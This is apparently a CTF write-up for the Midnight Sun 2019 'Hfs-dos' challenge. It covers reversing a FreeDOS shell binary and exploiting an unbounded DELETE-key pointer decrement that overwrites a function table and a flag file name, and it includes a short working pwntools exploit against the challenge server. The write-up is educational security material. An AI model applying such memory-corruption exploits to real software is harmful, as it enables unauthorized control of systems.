---
layout: post
title: Hfs-dos (pwn350)
ctf: Midnight Sun CTF Quals 2019
---

> You don't need a modern 'secure' language when you write bug-free code :) The flag is in FLAG2
> 
> Download: [hfs-os.tar.gz][download]

This is the second part of the HFS OS challenge series. To work on this challenge you must have gotten the password for [hfs-mbr][part1] first.

Upon entering the password, we are greeted with a message followed by a shell prompt.

```
[HFS SECURE SHELL] loaded at 100f:0100 (0x101f0) and ready for some binary carna
ge!

[HFS-DOS]>
```

We can interact with the command line prompt but the only valid command I managed to guess at this point is `exit`.

### Set up environment
*This is the same setup I used for the previous part. Just putting it here for easy reference.*

When importing *dos.img* into GHIDRA, it will not be able to recognize the file format. We can import it as a raw binary and set the processor to be x86 in 16-bit real mode. Before importing the file, also go to options and set the base address to be `0000:7c00` because 0x7c00 is where the bootloader starts.

To debug this in `GDB`, we can do `./run debug` to tell `QEMU` to run a gdbserver. In `GDB`, we can run the following commands to prepare the environment.

```
(gdb) target remote localhost:1234
Remote debugging using localhost:1234
(gdb) set architecture i8086
The target architecture is assumed to be i8086
(gdb) break *0x7c00
Breakpoint 1 at 0x7c00
```

Notice the `-s` and `-S` flags passed to `QEMU` when using `./run debug`. `-s` is for starting a `gdbserver` at port 1234, while `-S` is for `QEMU` to freeze CPU at startup, only starting execution after entering `c` (continue) in GDB.

Although I normally like to use GEF with `GDB`, but because `gef-remote` does not properly support x86 architectures at this point, I used this [gdbinit] script I found that is made to support real mode with `QEMU`. 

This [blog](http://ternet.fr/gdb_real_mode.html) explains some things about debugging programs running in real mode and under `QEMU`.

### Obtain code for HFS-DOS
Similar to the previous part, the routine of loading code and branching there happens a few more times. In the end, we want to obtain the code that manages the shell so that we can find the vulnerability in it.

At first, I followed the program execution after the password was accepted, eventually reaching the part where the program does an interrupt call 0x16 and find out which sectors of the image file is loaded. 

I won't show the details here, since it is pretty much the same as in the previous challenge (hfs-mbr). But eventually I gave up on this, because there were just so many sectors being loaded.

Looking at the output after entering the password again, I noticed the following line.

```
[HFS SECURE SHELL] loaded at 100f:0100 (0x101f0) and ready for some binary carnage!
```

Ok... The code for the shell should be at 0x101f0 in memory. Because I don't know how big the code is, I just tried some sizes until I see a lot of null bytes, and assumed that was the end. Dump that memory and we can start analysing it.

#### An easier way
Or, if you look at the strings in *dos.img*, you would find `FREEDOS2016`. Over [here](https://en.wikipedia.org/wiki/FreeDOS#History), it says that COMMAND.COM is the name of the command line interpreter.

So, we can use `fdisk` to find out the offset of the partition contained in *dos.img*, then mount it.

```bash
➤ fdisk -l dos.img
Disk dos.img: 10 MiB, 10485760 bytes, 20480 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x00000000

Device     Boot Start   End Sectors  Size Id Type
dos.img1   *       63 20159   20097  9.8M  1 FAT12
```

`fdisk` tells us that there is a FAT12 partition starting at 63. To mount it, we set the offset to be `63*512` (because sector size is 512 bytes) and pass it into the `mount` utility.

```bash
➤ mkdir /mnt/dos
➤ mount -o loop,offset=32256 dos.img /mnt/dos
➤ ls /mnt/dos
AUTOEXEC.BAT  COMMAND.COM  FLAG1  FLAG2  KERNEL.SYS
```

Indeed, there is a *COMMAND.COM* file which most likely handles the HFS-DOS shell. Both methods described works and gives the same binary to be analyzed.

### Available commands
Although he program is quite small, it is slightly troublesome to analyse. The decompiler output is not very reliable as it does not work well with the interrupt calls. So most of the reversing had to be done by looking at the disassembly.

Anyways, here is a pseudocode of the the shell program does.

```c
show_flag1();   // yes the flag for the previous part
print("\r\n[HFS SECURE SHELL] loaded at 100f:0100...");
print("\r\n[HFS-DOS]> ");
shell();
```

```c
void show_flag1() {
    print("[HFS SECURE SHELL] Here is your flag for HFS-...");
    open_flag1_file();
    read_flag1();
    print_flag1();
    close_flag1_file();
}
```

```c
void shell() {
start:
    char* command_buf_ptr = &command_buf;
    short command_len = 0;

    char c = read_char_from_keyboard();
    if (c == '\r')
        goto process_command;
    if (c == 0x7f) {    // this is the DELETE key
        command_buf_ptr--;
        change_cursor_position();
    }
    else {
        *command_buf_ptr = c;
        command_len++;

        if (command_len == 4)
            goto process_command;
    }

process_command:
    // 0: "ping"
    // 1: "vers"
    // 2: "myid"
    // 3: "pong"
    // 4: "exit"
    // 5: command not found
    short command_id = get_command_id();
    command_table[command_id]();

    print("\r\n[HFS-DOS]> ");
    goto start;
}
```

The shell reads a character from the keyboard, and stores the characters typed by the user in a buffer. A pointer to the buffer is used to track the position of the input (i.e. decrement when user types DELETE or increment otherwise). The current length of the input is also stored.

* If it is a carriage return, process the stored command.
* If it is a DELETE, move the pointer to the command buffer one byte backwards.
* Otherwise, append the character to the buffer, and process the command if the command is 4 bytes long.

For each command, there will be a corresponding index into a function table. The command processing stage is not very important, just printing strings such as `ping` or `PONG` depending on the command.

After processing a command, the program resets the pointer to the start of the buffer and the input length to 0.

### Out of bounds write
Notice the part where the program handles the DELETE key. There is no limit to how many times `command_buf_ptr` can be decremented. This means we can write into memory outside of the intended buffer. Let's look at the memory layout.

```
    commands_table
0000:0389 62 01           dw         162h               ; invalid command
0000:038b 65 01           dw         165h               ; ping
0000:038d 68 01           dw         168h               ; vers
0000:038f 6b 01           dw         16Bh               ; myid
0000:0391 6e 01           dw         16Eh               ; pong
0000:0393 71 01           dw         171h               ; error

    flag_file_name
0000:0395 46 4c 41        ds         "FLAG1\x00$"
          47 31 00
          24

    command_buf
0000:039c 00              ??         00h
0000:039d 00              ??         00h
0000:039e 00              ??         00h
0000:039f 00              ??         00h
```

Our `command_buf_ptr` is initialized right below the function table for the commands. This means we can move our pointer backwards to overwrite the addresses.

#### What to write?
Recall at the start of the program, the flag for the previous part is read from file and printed. We can overwrite the `pong` command to go there instead.

So conveniently, the file name of the flag is also just right above our input buffer. We can simply change it to `FLAG2` instead.

### Exploit
Knowing these, the exploitation stage should be fairly simple.
* Move our pointer back and overwrite the function pointer for `pong` to `show_flag1`
* Move our pointer back and overwrite the flag file name to `FLAG2`

Take note that the pointer will be reset after 4 input characters, so we cannot just do everything in one shot.

```
from pwn import *

p = remote("hfs-os-01.play.midnightsunctf.se", 31337)
# p = process("./run")

sleep(1)
p.sendline("sojupwner")
p.send("\x7f" * 11 + "\x4f\x01\x4f\x01")
p.send("\x7f" * 6 + "LAG2")
p.send("pong")
p.interactive()
```

`midnight{th4t_was_n0t_4_buG_1t_is_a_fEatuR3}`

---

I think the memory layout of the variables couldn't have been better placed... If the function table or flag file name was below the input buffer this would have been a big headache.

Feel free to ask anything in the comments.

[part1]:{{site.baseurl}}/ctfs/midnight-sun-quals-19/hfs-mbr/hfs-mbr
[download]:{{site.baseurl}}/ctfs/midnight-sun-quals-19/hfs-mbr/hfs-os.tar.gz
[gdbinit]:{{site.baseurl}}/ctfs/midnight-sun-quals-19/hfs-dos/gdbinit